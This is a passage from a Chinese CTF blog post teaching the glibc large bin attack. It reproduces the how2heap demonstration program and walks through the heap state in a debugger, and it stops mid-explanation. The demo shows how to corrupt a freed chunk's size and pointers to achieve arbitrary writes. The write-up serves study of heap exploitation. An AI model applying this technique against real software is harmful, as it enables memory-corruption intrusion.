@@ -1,0 +1,1039 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Large Bin Attack, Matrix">
+    <meta name="description" content="前言：我感觉这种利用有点借力打力的感觉。
+通过实例学习 large bin attack 的原理这里我们拿 how2heap 中的 large bin attack 中的源码来分析，记得看看malloc进行unsortedbin 分配的源码">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Large Bin Attack | Matrix</title>
+    <link rel="icon" type="image/jpeg" href="/medias/matrix.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="container">
+            <div class="nav-wrapper">
+                <div class="brand-logo">
+                    <a href="/" class="waves-effect waves-light">
+                        
+                        <img src="/medias/matrix.jpg" class="logo-img hide-on-small-only">
+                        
+                        <span class="logo-span">Matrix</span>
+                    </a>
+                </div>
+                
+
+<a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li>
+        <a id="toggleSearch" class="waves-effect waves-light">
+            <i id="searchIcon" class="mdi-action-search" title="搜索"></i>
+        </a>
+    </li>
+
+</ul>
+
+<div class="side-nav" id="mobile-nav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/matrix.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Matrix</div>
+        <div class="logo-desc">
+            
+            Fight Against Your Fate!
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        
+    </ul>
+
+    <div class="social-link">
+
+
+    <a href="mailto:2337463603@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2334763603" target="_blank" rel="noopener" class="tooltipped" data-tooltip="QQ联系我: 2334763603" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+</div>
+</div>
+
+            </div>
+        </div>
+
+        
+    </nav>
+</header>
+
+
+
+
+
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        Large Bin Attack
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" target="_blank">
+                                <span class="chip bg-color">原理学习</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF-PWN/" class="post-category" target="_blank">
+                                CTF-PWN
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-10-25
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        1.8k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        9 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>前言：我感觉这种利用有点借力打力的感觉。</p>
+<h2 id="通过实例学习-large-bin-attack-的原理"><a href="#通过实例学习-large-bin-attack-的原理" class="headerlink" title="通过实例学习 large bin attack 的原理"></a>通过实例学习 large bin attack 的原理</h2><p>这里我们拿 how2heap 中的 large bin attack 中的源码来分析，记得看看malloc进行unsortedbin 分配的源码</p>
+<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// 主要漏洞在这里</span>
+<span class="token comment" spellcheck="true">/*
+
+    This technique is taken from
+    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/
+
+    [...]
+
+              else
+              {
+                  victim->fd_nextsize = fwd;
+                  victim->bk_nextsize = fwd->bk_nextsize;
+                  fwd->bk_nextsize = victim;
+                  victim->bk_nextsize->fd_nextsize = victim;
+              }
+              bck = fwd->bk;
+
+    [...]
+
+    mark_bin (av, victim_index);
+    victim->bk = bck;
+    victim->fd = fwd;
+    fwd->bk = victim;
+    bck->fd = victim;
+
+    For more details on how large-bins are handled and sorted by ptmalloc,
+    please check the Background section in the aforementioned link.
+
+    [...]
+
+ */</span>
+
+<span class="token comment" spellcheck="true">// gcc large_bin_attack.c -o large_bin_attack -g</span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates large bin attack by writing a large unsigned long value into stack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"In practice, large bin attack is generally prepared for further attacks, such as rewriting the "</span>
+                    <span class="token string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> stack_var2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's first look at the targets we want to rewrite on stack:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_var1 (%p): %ld\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var1<span class="token punctuation">,</span> stack_var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_var2 (%p): %ld\n\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var2<span class="token punctuation">,</span> stack_var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x320</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we allocate the first large chunk on the heap at: %p\n"</span><span class="token punctuation">,</span> p1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span>
+                    <span class="token string">" the first large chunk during the free()\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Then, we allocate the second large chunk on the heap at: %p\n"</span><span class="token punctuation">,</span> p2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span>
+                    <span class="token string">" the second large chunk during the free()\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Finally, we allocate the third large chunk on the heap at: %p\n"</span><span class="token punctuation">,</span> p3 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And allocate another fastbin chunk in order to avoid consolidating the top chunk with"</span>
+                    <span class="token string">" the third large chunk during the free()\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We free the first and second large chunks now and they will be inserted in the unsorted bin:"</span>
+                    <span class="token string">" [ %p &lt;--> %p ]\n\n"</span><span class="token punctuation">,</span>
+            <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p2 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">void</span><span class="token operator">*</span> p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"</span>
+                    <span class="token string">" freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"</span>
+                    <span class="token string">", and reinsert the remaining of the freed first large chunk into the unsorted bin:"</span>
+                    <span class="token string">" [ %p ]\n\n"</span><span class="token punctuation">,</span>
+            <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1 <span class="token operator">+</span> <span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we free the third large chunk and it will be inserted in the unsorted bin:"</span>
+                    <span class="token string">" [ %p &lt;--> %p ]\n\n"</span><span class="token punctuation">,</span>
+            <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p3 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">//------------VULNERABILITY-----------</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""</span>
+                    <span class="token string">" as well as its \"bk\" and \"bk_nextsize\" pointers\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"</span>
+                    <span class="token string">" at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"</span>
+                    <span class="token string">" \"bk_nextsize\" to 32 bytes before stack_var2\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    p2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3f1</span><span class="token punctuation">;</span>
+    p2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    p2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    p2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var2 <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">//------------------------------------</span>
+
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."</span>
+                    <span class="token string">" During this time, targets should have already been rewritten:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_var1 (%p): %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>stack_var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_var2 (%p): %p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>stack_var2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>stack_var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p><strong>编译完以后，注意！一定要用 glibc2.25 的 loader，改变 loader 的方法可以看这里：<a href="https://www.jianshu.com/p/1a966b62b3d4" target="_blank" rel="noopener">https://www.jianshu.com/p/1a966b62b3d4</a></strong></p>
+<p>pwngdb 走起，开始我们的分析之旅：<br>直接跳到：void* p4 = malloc(0x90);比how2heap多了个赋值</p>
+<pre class=" language-c"><code class="language-c">  <span class="token number">73</span> 
+ ► <span class="token number">74</span>     <span class="token keyword">void</span><span class="token operator">*</span> p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">75</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"</span></code></pre>
+<p>前面的操作我们主要关注对大chunk的malloc与free而不是malloc(0x20)，执行到这里我们已经free了两个大chunk：p1(0x320) smallchunk , p2(0x400) largechunk<br><img src="https://s1.ax1x.com/2020/10/25/BeGJN6.png" alt=""><br>要注意的是：<br><strong>p1 的大小是 0x330 &lt; 0x3f0 大小属于 small bin，而 p2 的大小是 0x410 属于 large bin</strong><br><strong>执行完74行：</strong></p>
+<pre class=" language-c"><code class="language-c">   <span class="token number">74</span>     <span class="token keyword">void</span><span class="token operator">*</span> p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ ► <span class="token number">75</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"</span></code></pre>
+<p>短短的一个malloc赋值，却蕴含天机：（如果不熟悉了去看点源码）</p>
+<ul>
+<li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li>
+<li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li>
+<li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li>
+<li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li>
+<li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中<br>chunk链如下：<pre class=" language-java"><code class="language-java">                top<span class="token operator">:</span> <span class="token function">0x603be0</span> <span class="token punctuation">(</span>size <span class="token operator">:</span> <span class="token number">0x20420</span><span class="token punctuation">)</span> 
+     last_remainder<span class="token operator">:</span> <span class="token function">0x6030a0</span> <span class="token punctuation">(</span>size <span class="token operator">:</span> <span class="token number">0x290</span><span class="token punctuation">)</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+          unsortbin<span class="token operator">:</span> <span class="token function">0x6030a0</span> <span class="token punctuation">(</span>size <span class="token operator">:</span> <span class="token number">0x290</span><span class="token punctuation">)</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+       largebin<span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0x603360</span> <span class="token punctuation">(</span>size <span class="token operator">:</span> <span class="token number">0x410</span><span class="token punctuation">)</span></code></pre>
+unsorted bin 中有一个 chunk 大小是 0x330 - 0xa0 = 0x290<br>large bin <strong>某一个序列</strong>的 bin 中有一个 chunk 大小是 0x410</li>
+</ul>
+<p>继续执行完free(p3):</p>
+<pre class=" language-c"><code class="language-c">   <span class="token number">80</span>     <span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//free(0x400)</span>
+ ► <span class="token number">81</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we free the third large chunk and it will be inserted in the unsorted bin:"</span>
+   <span class="token number">82</span> </code></pre>
+<p>那么现在unsortedbin链中又多了一个chunk，放在第一个：</p>
+<pre class=" language-java"><code class="language-java">                  top<span class="token operator">:</span> <span class="token function">0x603be0</span> <span class="token punctuation">(</span>size <span class="token operator">:</span> <span class="token number">0x20420</span><span class="token punctuation">)</span> 
+       last_remainder<span class="token operator">:</span> <span class="token function">0x6030a0</span> <span class="token punctuation">(</span>size <span class="token operator">:</span> <span class="token number">0x290</span><span class="token punctuation">)</span> 
+            unsortbin<span class="token operator">:</span> <span class="token function">0x6037a0</span> <span class="token punctuation">(</span>size <span class="token operator">:</span> <span class="token number">0x410</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x6030a0</span> <span class="token punctuation">(</span>size <span class="token operator">:</span> <span class="token number">0x290</span><span class="token punctuation">)</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+         largebin<span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0x603360</span> <span class="token punctuation">(</span>size <span class="token operator">:</span> <span class="token number">0x410</span><span class="token punctuation">)</span></code></pre>
+<p>进行对p2 chunk的构造：</p>
+<pre class=" language-c"><code class="language-c">    p2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3f1</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//数组越界，对应size字段</span>
+    p2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//fd</span>
+    p2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//fd_nextsize</span>
+    p2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//bk</span>
+    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var2 <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//bk_nextsize</span></code></pre>
+<p>修改 p2（large bin chunk），修改结果如下：<br><img src="https://s1.ax1x.com/2020/10/25/BeGGAx.png" alt=""></p>
+<pre class=" language-java"><code class="language-java">largebins
+<span class="token number">0x400</span> <span class="token punctuation">[</span>corrupted<span class="token punctuation">]</span>
+FD<span class="token operator">:</span> <span class="token number">0x603360</span> —<span class="token operator">></span> <span class="token number">0x7fffffffddf0</span> —<span class="token operator">></span> <span class="token number">0x603010</span> <span class="token operator">&lt;</span>— <span class="token number">0x0</span>
+BK<span class="token operator">:</span> <span class="token number">0x603360</span> <span class="token operator">&lt;</span>— <span class="token number">0x0</span></code></pre>
+<p>然后又进行一次malloc(0x90):</p>
+<pre class=" language-c"><code class="language-c">   <span class="token number">100</span>     <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">101</span>  
+ ► <span class="token number">102</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."</span>
+   <span class="token number">103</span> </code></pre>
+<p>与第一次 malloc(0x90) 过程类似：</p>
+<ul>
+<li>从 unsorted bin 中拿出最后一个 chunk（size = 0x290），放入 small bin 中，标记该序列的 small bin 有空闲 chunk</li>
+<li>再从 unsorted bin 中拿出最后一个 chunk（size = 0x410）</li>
+</ul>
+<p>重点来了：<br>由于这次拿的是属于 large bin chunk，进入了 else 分支：</p>
+<pre class=" language-c"><code class="language-c">             victim_index <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//下标</span>
